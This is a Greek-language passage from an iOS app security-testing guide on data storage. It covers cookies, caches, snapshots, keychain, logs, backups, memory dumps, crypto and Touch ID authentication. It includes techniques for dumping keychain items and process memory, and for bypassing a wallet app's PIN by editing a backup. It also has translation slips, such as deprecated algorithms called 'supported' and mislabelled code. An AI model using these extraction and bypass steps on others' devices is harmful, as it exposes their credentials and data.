Για να εντοπιστούν πιθανές βάσεις δεδομένων Couchbase σε μια συσκευή, θα πρέπει να ελεγχθεί ο παρακάτω κατάλογος:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

Το iOS αποθηκεύει τα cookies των εφαρμογών στο **`Library/Cookies/cookies.binarycookies`** μέσα στον φάκελο κάθε εφαρμογής. Ωστόσο, οι προγραμματιστές μερικές φορές αποφασίζουν να τα αποθηκεύσουν στο **keychain** καθώς το αναφερόμενο **cookie file μπορεί να προσπελαστεί σε αντίγραφα ασφαλείας**.

Για να ελέγξετε το αρχείο cookies μπορείτε να χρησιμοποιήσετε [**αυτό το python script**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ή να χρησιμοποιήσετε το **`ios cookies get`** του objection.\
**Μπορείτε επίσης να χρησιμοποιήσετε το objection για να** μετατρέψετε αυτά τα αρχεία σε μορφή JSON και να ελέγξετε τα δεδομένα.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

Από προεπιλογή, το NSURLSession αποθηκεύει δεδομένα, όπως **HTTP requests και responses στη βάση δεδομένων Cache.db**. Αυτή η βάση δεδομένων μπορεί να περιέχει **ευαίσθητα δεδομένα**, εάν έχουν αποθηκευτεί tokens, usernames ή οποιαδήποτε άλλη ευαίσθητη πληροφορία. Για να βρείτε τις αποθηκευμένες πληροφορίες, ανοίξτε τον κατάλογο δεδομένων της εφαρμογής (`/var/mobile/Containers/Data/Application/<UUID>`) και μεταβείτε στο `/Library/Caches/<Bundle Identifier>`. Η **WebKit cache αποθηκεύεται επίσης στο αρχείο Cache.db**. **Objection** μπορεί να ανοίξει και να αλληλεπιδράσει με τη βάση δεδομένων με την εντολή `sqlite connect Cache.db`, καθώς είναι μια **κανονική βάση δεδομένων SQLite**.

Συνιστάται να απενεργοποιήσετε την αποθήκευση αυτών των δεδομένων, καθώς μπορεί να περιέχουν ευαίσθητες πληροφορίες στην αίτηση ή την απάντηση. Η παρακάτω λίστα δείχνει διάφορους τρόπους για να το επιτύχετε αυτό:

1. Συνιστάται να αφαιρείτε τις αποθηκευμένες απαντήσεις μετά την αποσύνδεση. Αυτό μπορεί να γίνει με τη μέθοδο που παρέχει η Apple, που ονομάζεται [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Μπορείτε να καλέσετε αυτή τη μέθοδο ως εξής:

`URLCache.shared.removeAllCachedResponses()`

Αυτή η μέθοδος θα αφαιρέσει όλες τις αποθηκευμένες αιτήσεις και απαντήσεις από το αρχείο Cache.db.

2. Εάν δεν χρειάζεται να χρησιμοποιήσετε το πλεονέκτημα των cookies, θα ήταν προτιμότερο να χρησιμοποιήσετε την ιδιότητα διαμόρφωσης [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) του URLSession, η οποία θα απενεργοποιήσει την αποθήκευση cookies και Caches.

[Apple documentation](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`An ephemeral session configuration object is similar to a default session configuration (see default), except that the corresponding session object doesn’t store caches, credential stores, or any session-related data to disk. Instead, session-related data is stored in RAM. The only time an ephemeral session writes data to disk is when you tell it to write the contents of a URL to a file.`

3. Η αποθήκευση μπορεί επίσης να απενεργοποιηθεί ρυθμίζοντας την Πολιτική Cache σε [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Αυτό θα απενεργοποιήσει την αποθήκευση Cache με οποιονδήποτε τρόπο, είτε στη μνήμη είτε στο δίσκο.

### Snapshots

Όποτε πατάτε το κουμπί αρχικής οθόνης, το iOS **λαμβάνει μια στιγμιότυπο της τρέχουσας οθόνης** για να μπορέσει να κάνει τη μετάβαση στην εφαρμογή με πολύ πιο ομαλό τρόπο. Ωστόσο, εάν υπάρχουν **ευαίσθητα** **δεδομένα** στην τρέχουσα οθόνη, θα **αποθηκευτούν** στην **εικόνα** (η οποία **διατηρείται** **μετά** **από** **επανεκκινήσεις**). Αυτά είναι τα στιγμιότυπα που μπορείτε επίσης να αποκτήσετε πρόσβαση διπλά πατώντας την αρχική οθόνη για να αλλάξετε μεταξύ εφαρμογών.

Εκτός εάν το iPhone είναι jailbroken, ο **επιτιθέμενος** χρειάζεται να έχει **πρόσβαση** στη **συσκευή** **ξεκλειδωμένη** για να δει αυτά τα στιγμιότυπα. Από προεπιλογή, το τελευταίο στιγμιότυπο αποθηκεύεται στο sandbox της εφαρμογής στον φάκελο `Library/Caches/Snapshots/` ή `Library/SplashBoard/Snapshots` (οι αξιόπιστοι υπολογιστές δεν μπορούν να έχουν πρόσβαση στο filesystem από το iOX 7.0).

Ένας τρόπος για να αποτρέψετε αυτή τη κακή συμπεριφορά είναι να βάλετε μια κενή οθόνη ή να αφαιρέσετε τα ευαίσθητα δεδομένα πριν από τη λήψη του στιγμιότυπου χρησιμοποιώντας τη λειτουργία `ApplicationDidEnterBackground()`.

Η παρακάτω είναι μια δείγμα μεθόδου αποκατάστασης που θα ορίσει ένα προεπιλεγμένο στιγμιότυπο.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Αυτό ρυθμίζει την εικόνα φόντου σε `overlayImage.png` όποτε η εφαρμογή είναι στο παρασκήνιο. Αποτρέπει τις ευαίσθητες διαρροές δεδομένων επειδή το `overlayImage.png` θα υπερκαλύπτει πάντα την τρέχουσα προβολή.

### Keychain

Για την πρόσβαση και τη διαχείριση του iOS keychain, είναι διαθέσιμα εργαλεία όπως το [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper), κατάλληλο για jailbroken συσκευές. Επιπλέον, το [**Objection**](https://github.com/sensepost/objection) παρέχει την εντολή `ios keychain dump` για παρόμοιους σκοπούς.

#### **Αποθήκευση Διαπιστευτηρίων**

Η κλάση **NSURLCredential** είναι ιδανική για την αποθήκευση ευαίσθητων πληροφοριών απευθείας στο keychain, παρακάμπτοντας την ανάγκη για NSUserDefaults ή άλλες περιτυλίξεις. Για να αποθηκεύσετε διαπιστευτήρια μετά την είσοδο, χρησιμοποιείται ο παρακάτω κώδικας Swift:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Για να εξαγάγετε αυτά τα αποθηκευμένα διαπιστευτήρια, χρησιμοποιείται η εντολή `ios nsurlcredentialstorage dump` του Objection.

## **Προσαρμοσμένα Πληκτρολόγια και Κρυφή Μνήμη Πληκτρολογίου**

Με το iOS 8.0 και μετά, οι χρήστες μπορούν να εγκαταστήσουν προσαρμοσμένες επεκτάσεις πληκτρολογίου, οι οποίες είναι διαχειρίσιμες κάτω από **Ρυθμίσεις > Γενικά > Πληκτρολόγιο > Πληκτρολόγια**. Ενώ αυτά τα πληκτρολόγια προσφέρουν επεκταμένη λειτουργικότητα, ενέχουν τον κίνδυνο καταγραφής πλήκτρων και μετάδοσης δεδομένων σε εξωτερικούς διακομιστές, αν και οι χρήστες ενημερώνονται για τα πληκτρολόγια που απαιτούν πρόσβαση στο δίκτυο. Οι εφαρμογές μπορούν και πρέπει να περιορίζουν τη χρήση προσαρμοσμένων πληκτρολογίων για την εισαγωγή ευαίσθητων πληροφοριών.

**Συστάσεις Ασφαλείας:**

- Συνιστάται να απενεργοποιήσετε τα πληκτρολόγια τρίτων για αυξημένη ασφάλεια.
- Να είστε προσεκτικοί με τις δυνατότητες αυτόματης διόρθωσης και αυτόματων προτάσεων του προεπιλεγμένου πληκτρολογίου iOS, οι οποίες θα μπορούσαν να αποθηκεύσουν ευαίσθητες πληροφορίες σε αρχεία κρυφής μνήμης που βρίσκονται σε `Library/Keyboard/{locale}-dynamic-text.dat` ή `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Αυτά τα αρχεία κρυφής μνήμης θα πρέπει να ελέγχονται τακτικά για ευαίσθητα δεδομένα. Συνιστάται η επαναφορά του λεξικού πληκτρολογίου μέσω **Ρυθμίσεις > Γενικά > Επαναφορά > Επαναφορά Λεξικού Πληκτρολογίου** για την εκκαθάριση των αποθηκευμένων δεδομένων.
- Η παρεμβολή της δικτυακής κίνησης μπορεί να αποκαλύψει αν ένα προσαρμοσμένο πληκτρολόγιο μεταδίδει πλήκτρα απομακρυσμένα.

### **Πρόληψη Κρυφής Μνήμης Πεδίου Κειμένου**

Το [UITextInputTraits protocol](https://developer.apple.com/reference/uikit/uitextinputtraits) προσφέρει ιδιότητες για τη διαχείριση της αυτόματης διόρθωσης και της ασφαλούς εισαγωγής κειμένου, που είναι απαραίτητες για την πρόληψη της κρυφής μνήμης ευαίσθητων πληροφοριών. Για παράδειγμα, η απενεργοποίηση της αυτόματης διόρθωσης και η ενεργοποίηση της ασφαλούς εισαγωγής κειμένου μπορεί να επιτευχθεί με:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Επιπλέον, οι προγραμματιστές θα πρέπει να διασφαλίσουν ότι τα πεδία κειμένου, ειδικά αυτά για την εισαγωγή ευαίσθητων πληροφοριών όπως κωδικοί πρόσβασης και PIN, απενεργοποιούν την αποθήκευση στην κρυφή μνήμη ρυθμίζοντας το `autocorrectionType` σε `UITextAutocorrectionTypeNo` και το `secureTextEntry` σε `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Καταγραφές**

Η αποσφαλμάτωση κώδικα συχνά περιλαμβάνει τη χρήση της **καταγραφής**. Υπάρχει κίνδυνος καθώς **οι καταγραφές μπορεί να περιέχουν ευαίσθητες πληροφορίες**. Στο παρελθόν, σε iOS 6 και παλαιότερες εκδόσεις, οι καταγραφές ήταν προσβάσιμες σε όλες τις εφαρμογές, θέτοντας σε κίνδυνο τη διαρροή ευαίσθητων δεδομένων. **Τώρα, οι εφαρμογές περιορίζονται στην πρόσβαση μόνο στις δικές τους καταγραφές**.

Παρά αυτούς τους περιορισμούς, ένας **επιτιθέμενος με φυσική πρόσβαση** σε μια ξεκλείδωτη συσκευή μπορεί να εκμεταλλευτεί αυτό συνδέοντας τη συσκευή σε έναν υπολογιστή και **διαβάζοντας τις καταγραφές**. Είναι σημαντικό να σημειωθεί ότι οι καταγραφές παραμένουν στον δίσκο ακόμη και μετά την απεγκατάσταση της εφαρμογής.

Για να μετριαστούν οι κίνδυνοι, συνιστάται να **αλληλεπιδράσετε διεξοδικά με την εφαρμογή**, εξερευνώντας όλες τις λειτουργίες και τις εισόδους της για να διασφαλίσετε ότι δεν καταγράφεται κατά λάθος καμία ευαίσθητη πληροφορία.

Κατά την ανασκόπηση του πηγαίου κώδικα της εφαρμογής για πιθανές διαρροές, αναζητήστε τόσο **προκαθορισμένες** όσο και **προσαρμοσμένες δηλώσεις καταγραφής** χρησιμοποιώντας λέξεις-κλειδιά όπως `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` για ενσωματωμένες λειτουργίες, και οποιαδήποτε αναφορά σε `Logging` ή `Logfile` για προσαρμοσμένες υλοποιήσεις.

### **Παρακολούθηση Συστήματος Καταγραφών**

Οι εφαρμογές καταγράφουν διάφορα κομμάτια πληροφοριών που μπορεί να είναι ευαίσθητα. Για να παρακολουθήσετε αυτές τις καταγραφές, εργαλεία και εντολές όπως:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
είναι χρήσιμα. Επιπλέον, **Xcode** παρέχει έναν τρόπο για να συλλέξετε τα αρχεία καταγραφής κονσόλας:

1. Ανοίξτε το Xcode.
2. Συνδέστε τη συσκευή iOS.
3. Μεταβείτε στο **Window** -> **Devices and Simulators**.
4. Επιλέξτε τη συσκευή σας.
5. Προκαλέστε το ζήτημα που ερευνάτε.
6. Χρησιμοποιήστε το κουμπί **Open Console** για να δείτε τα αρχεία καταγραφής σε ένα νέο παράθυρο.

Για πιο προηγμένη καταγραφή, η σύνδεση στο shell της συσκευής και η χρήση του **socat** μπορεί να παρέχει παρακολούθηση αρχείων καταγραφής σε πραγματικό χρόνο:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Ακολουθούν εντολές για την παρακολούθηση δραστηριοτήτων καταγραφής, οι οποίες μπορεί να είναι πολύτιμες για τη διάγνωση προβλημάτων ή την αναγνώριση πιθανής διαρροής δεδομένων στα αρχεία καταγραφής.

## Αντίγραφα ασφαλείας

Οι **λειτουργίες αυτόματης δημιουργίας αντιγράφων ασφαλείας** είναι ενσωματωμένες στο iOS, διευκολύνοντας τη δημιουργία αντιγράφων δεδομένων συσκευής μέσω του iTunes (έως macOS Catalina), Finder (από macOS Catalina και μετά) ή iCloud. Αυτά τα αντίγραφα ασφαλείας περιλαμβάνουν σχεδόν όλα τα δεδομένα της συσκευής, εξαιρουμένων των πολύ ευαίσθητων στοιχείων όπως οι λεπτομέρειες του Apple Pay και οι ρυθμίσεις του Touch ID.

### Κίνδυνοι Ασφαλείας

Η συμπερίληψη των **εγκατεστημένων εφαρμογών και των δεδομένων τους** στα αντίγραφα ασφαλείας εγείρει το ζήτημα της πιθανής **διαρροής δεδομένων** και του κινδύνου ότι **οι τροποποιήσεις των αντιγράφων ασφαλείας θα μπορούσαν να αλλάξουν τη λειτουργικότητα της εφαρμογής**. Συνιστάται να **μην αποθηκεύετε ευαίσθητες πληροφορίες σε απλό κείμενο** μέσα στον κατάλογο οποιασδήποτε εφαρμογής ή στους υποκαταλόγους της για να μετριαστούν αυτοί οι κίνδυνοι.

### Εξαίρεση Αρχείων από Αντίγραφα Ασφαλείας

Τα αρχεία στον `Documents/` και `Library/Application Support/` δημιουργούνται αντίγραφα ασφαλείας από προεπιλογή. Οι προγραμματιστές μπορούν να εξαιρέσουν συγκεκριμένα αρχεία ή καταλόγους από τα αντίγραφα ασφαλείας χρησιμοποιώντας το `NSURL setResourceValue:forKey:error:` με το `NSURLIsExcludedFromBackupKey`. Αυτή η πρακτική είναι κρίσιμη για την προστασία ευαίσθητων δεδομένων από το να περιλαμβάνονται στα αντίγραφα ασφαλείας.

### Δοκιμή για Ευπάθειες

Για να αξιολογήσετε την ασφάλεια των αντιγράφων ασφαλείας μιας εφαρμογής, ξεκινήστε με τη **δημιουργία ενός αντιγράφου ασφαλείας** χρησιμοποιώντας το Finder, στη συνέχεια εντοπίστε το χρησιμοποιώντας καθοδήγηση από [την επίσημη τεκμηρίωση της Apple](https://support.apple.com/en-us/HT204215). Αναλύστε το αντίγραφο ασφαλείας για ευαίσθητα δεδομένα ή ρυθμίσεις που θα μπορούσαν να τροποποιηθούν για να επηρεάσουν τη συμπεριφορά της εφαρμογής.

Ευαίσθητες πληροφορίες μπορούν να αναζητηθούν χρησιμοποιώντας εργαλεία γραμμής εντολών ή εφαρμογές όπως το [iMazing](https://imazing.com). Για κρυπτογραφημένα αντίγραφα ασφαλείας, η παρουσία κρυπτογράφησης μπορεί να επιβεβαιωθεί ελέγχοντας το κλειδί "IsEncrypted" στο αρχείο "Manifest.plist" στη ρίζα του αντιγράφου ασφαλείας.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Για την αντιμετώπιση κρυπτογραφημένων αντιγράφων ασφαλείας, τα σενάρια Python που είναι διαθέσιμα στο [DinoSec's GitHub repo](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), όπως το **backup_tool.py** και το **backup_passwd.py**, μπορεί να είναι χρήσιμα, αν και ενδέχεται να απαιτούν προσαρμογές για συμβατότητα με τις τελευταίες εκδόσεις του iTunes/Finder. Το [**iOSbackup** εργαλείο](https://pypi.org/project/iOSbackup/) είναι μια άλλη επιλογή για την πρόσβαση σε αρχεία εντός κωδικοποιημένων αντιγράφων ασφαλείας.

### Τροποποίηση Συμπεριφοράς Εφαρμογής

Ένα παράδειγμα τροποποίησης της συμπεριφοράς μιας εφαρμογής μέσω τροποποιήσεων αντιγράφων ασφαλείας αποδεικνύεται στην [εφαρμογή πορτοφολιού bitcoin Bither](https://github.com/bither/bither-ios), όπου το PIN κλειδώματος της διεπαφής αποθηκεύεται στο `net.bither.plist` κάτω από το κλειδί **pin_code**. Η αφαίρεση αυτού του κλειδιού από το plist και η αποκατάσταση του αντιγράφου ασφαλείας αφαιρεί την απαίτηση PIN, παρέχοντας απεριόριστη πρόσβαση.

## Περίληψη σχετικά με τη Δοκιμή Μνήμης για Ευαίσθητα Δεδομένα

Όταν ασχολείστε με ευαίσθητες πληροφορίες που αποθηκεύονται στη μνήμη μιας εφαρμογής, είναι κρίσιμο να περιορίσετε τον χρόνο έκθεσης αυτών των δεδομένων. Υπάρχουν δύο κύριες προσεγγίσεις για την εξέταση του περιεχομένου της μνήμης: **δημιουργία ενός dump μνήμης** και **ανάλυση της μνήμης σε πραγματικό χρόνο**. Και οι δύο μέθοδοι έχουν τις προκλήσεις τους, συμπεριλαμβανομένου του ενδεχόμενου να χάσετε κρίσιμα δεδομένα κατά τη διάρκεια της διαδικασίας dump ή ανάλυσης.

## **Ανάκτηση και Ανάλυση ενός Dump Μνήμης**

Για συσκευές που είναι jailbroken και μη jailbroken, εργαλεία όπως το [objection](https://github.com/sensepost/objection) και το [Fridump](https://github.com/Nightbringer21/fridump) επιτρέπουν την εξαγωγή της μνήμης διαδικασίας μιας εφαρμογής. Αφού γίνει η εξαγωγή, η ανάλυση αυτών των δεδομένων απαιτεί διάφορα εργαλεία, ανάλογα με τη φύση των πληροφοριών που αναζητάτε.

Για να εξάγετε συμβολοσειρές από ένα dump μνήμης, μπορούν να χρησιμοποιηθούν εντολές όπως `strings` ή `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Για πιο λεπτομερή ανάλυση, συμπεριλαμβανομένης της αναζήτησης συγκεκριμένων τύπων δεδομένων ή προτύπων, το **radare2** προσφέρει εκτενείς δυνατότητες αναζήτησης:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ανάλυση Μνήμης Εκτέλεσης**

**r2frida** παρέχει μια ισχυρή εναλλακτική για την επιθεώρηση της μνήμης μιας εφαρμογής σε πραγματικό χρόνο, χωρίς την ανάγκη για dump μνήμης. Αυτό το εργαλείο επιτρέπει την εκτέλεση εντολών αναζήτησης απευθείας στη μνήμη της εκτελούμενης εφαρμογής:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Σπασμένη Κρυπτογραφία

### Κακές Διαδικασίες Διαχείρισης Κλειδιών

Ορισμένοι προγραμματιστές αποθηκεύουν ευαίσθητα δεδομένα στην τοπική αποθήκευση και τα κρυπτογραφούν με ένα κλειδί σκληρά κωδικοποιημένο/προβλέψιμο στον κώδικα. Αυτό δεν θα έπρεπε να γίνεται καθώς κάποια αναστροφή θα μπορούσε να επιτρέψει στους επιτιθέμενους να εξάγουν τις εμπιστευτικές πληροφορίες.

### Χρήση Ανασφαλών και/ή Υποστηριζόμενων Αλγορίθμων

Οι προγραμματιστές δεν θα πρέπει να χρησιμοποιούν **υποστηριζόμενους αλγορίθμους** για να εκτελούν **ελέγχους** εξουσιοδότησης, **να αποθηκεύουν** ή **να στέλνουν** δεδομένα. Ορισμένοι από αυτούς τους αλγορίθμους είναι: RC4, MD4, MD5, SHA1... Αν χρησιμοποιούνται **hashes** για την αποθήκευση κωδικών πρόσβασης, θα πρέπει να χρησιμοποιούνται hashes ανθεκτικά σε brute-force με αλάτι.

### Έλεγχος

Οι κύριοι έλεγχοι που πρέπει να εκτελούνται είναι να βρείτε αν μπορείτε να βρείτε **σκληρά κωδικοποιημένους** κωδικούς/μυστικά στον κώδικα, ή αν αυτά είναι **προβλέψιμα**, και αν ο κώδικας χρησιμοποιεί κάποιο είδος **αδύναμων** **κρυπτογραφικών** αλγορίθμων.

Είναι ενδιαφέρον να γνωρίζετε ότι μπορείτε να **παρακολουθείτε** ορισμένες **βιβλιοθήκες** **κρυπτογραφίας** αυτόματα χρησιμοποιώντας **objection** με:
```swift
ios monitor crypt
```
Για **περισσότερες πληροφορίες** σχετικά με τις κρυπτογραφικές APIs και βιβλιοθήκες iOS, επισκεφθείτε [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Τοπική Αυθεντικοποίηση

Η **τοπική αυθεντικοποίηση** παίζει κρίσιμο ρόλο, ειδικά όταν αφορά την προστασία της πρόσβασης σε ένα απομακρυσμένο σημείο μέσω κρυπτογραφικών μεθόδων. Η ουσία εδώ είναι ότι χωρίς σωστή υλοποίηση, οι μηχανισμοί τοπικής αυθεντικοποίησης μπορούν να παρακαμφθούν.

Το [**Local Authentication framework**](https://developer.apple.com/documentation/localauthentication) της Apple και το [**keychain**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) παρέχουν ισχυρές APIs για τους προγραμματιστές ώστε να διευκολύνουν τα διαλόγους αυθεντικοποίησης χρηστών και να χειρίζονται με ασφάλεια μυστικά δεδομένα, αντίστοιχα. Το Secure Enclave ασφαλίζει το αναγνωριστικό δακτυλικού αποτυπώματος για το Touch ID, ενώ το Face ID βασίζεται στην αναγνώριση προσώπου χωρίς να διακυβεύει τα βιομετρικά δεδομένα.

Για την ενσωμάτωση του Touch ID/Face ID, οι προγραμματιστές έχουν δύο επιλογές API:

- **`LocalAuthentication.framework`** για αυθεντικοποίηση χρηστών υψηλού επιπέδου χωρίς πρόσβαση σε βιομετρικά δεδομένα.
- **`Security.framework`** για πρόσβαση σε υπηρεσίες keychain χαμηλού επιπέδου, ασφαλίζοντας μυστικά δεδομένα με βιομετρική αυθεντικοποίηση. Διάφοροι [open-source wrappers](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) διευκολύνουν την πρόσβαση στο keychain.

> [!CAUTION]
> Ωστόσο, τόσο το `LocalAuthentication.framework` όσο και το `Security.framework` παρουσιάζουν ευπάθειες, καθώς επιστρέφουν κυρίως boolean τιμές χωρίς να μεταδίδουν δεδομένα για τις διαδικασίες αυθεντικοποίησης, καθιστώντας τα ευάλωτα σε παράκαμψη (ανατρέξτε στο [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).

### Υλοποίηση Τοπικής Αυθεντικοποίησης

Για να ζητήσουν από τους χρήστες αυθεντικοποίηση, οι προγραμματιστές θα πρέπει να χρησιμοποιήσουν τη μέθοδο **`evaluatePolicy`** μέσα στην κλάση **`LAContext`**, επιλέγοντας μεταξύ:

- **`deviceOwnerAuthentication`**: Ζητάει Touch ID ή κωδικό πρόσβασης συσκευής, αποτυγχάνοντας αν κανένα από τα δύο δεν είναι ενεργοποιημένο.
- **`deviceOwnerAuthenticationWithBiometrics`**: Ζητάει αποκλειστικά Touch ID.

Μια επιτυχής αυθεντικοποίηση υποδεικνύεται από μια boolean τιμή επιστροφής από το **`evaluatePolicy`**, υποδεικνύοντας μια πιθανή αδυναμία ασφαλείας.

### Τοπική Αυθεντικοποίηση χρησιμοποιώντας Keychain

Η υλοποίηση **τοπικής αυθεντικοποίησης** σε εφαρμογές iOS περιλαμβάνει τη χρήση των **keychain APIs** για την ασφαλή αποθήκευση μυστικών δεδομένων όπως τα διαπιστευτήρια αυθεντικοποίησης. Αυτή η διαδικασία διασφαλίζει ότι τα δεδομένα μπορούν να προσπελαστούν μόνο από τον χρήστη, χρησιμοποιώντας τον κωδικό πρόσβασης της συσκευής τους ή βιομετρική αυθεντικοποίηση όπως το Touch ID.

Το keychain προσφέρει τη δυνατότητα να ορίσετε στοιχεία με το χαρακτηριστικό `SecAccessControl`, το οποίο περιορίζει την πρόσβαση στο στοιχείο μέχρι ο χρήστης να αυθεντικοποιηθεί επιτυχώς μέσω Touch ID ή κωδικού πρόσβασης συσκευής. Αυτή η δυνατότητα είναι κρίσιμη για την ενίσχυση της ασφάλειας.

Παρακάτω παρατίθενται παραδείγματα κώδικα σε Swift και Objective-C που δείχνουν πώς να αποθηκεύσετε και να ανακτήσετε μια συμβολοσειρά από/στο keychain, εκμεταλλευόμενοι αυτές τις δυνατότητες ασφαλείας. Τα παραδείγματα δείχνουν συγκεκριμένα πώς να ρυθμίσετε τον έλεγχο πρόσβασης ώστε να απαιτεί αυθεντικοποίηση Touch ID και να διασφαλίσετε ότι τα δεδομένα είναι προσβάσιμα μόνο στη συσκευή στην οποία ρυθμίστηκαν, υπό την προϋπόθεση ότι έχει ρυθμιστεί κωδικός πρόσβασης συσκευής.

{{#tabs}}
{{#tab name="Swift"}}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{{#endtab}}

{{#tab name="Objective-C"}}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{{#endtab}}
{{#endtabs}}

Τώρα μπορούμε να ζητήσουμε το αποθηκευμένο στοιχείο από το keychain. Οι υπηρεσίες keychain θα παρουσιάσουν το διάλογο αυθεντικοποίησης στον χρήστη και θα επιστρέψουν δεδομένα ή nil ανάλογα με το αν παρέχεται ή όχι ένα κατάλληλο δακτυλικό αποτύπωμα.

{{#tabs}}
{{#tab name="Swift"}}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{{#endtab}}

{{#tab name="Objective-C"}}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{{#endtab}}
{{#endtabs}}

### Ανίχνευση

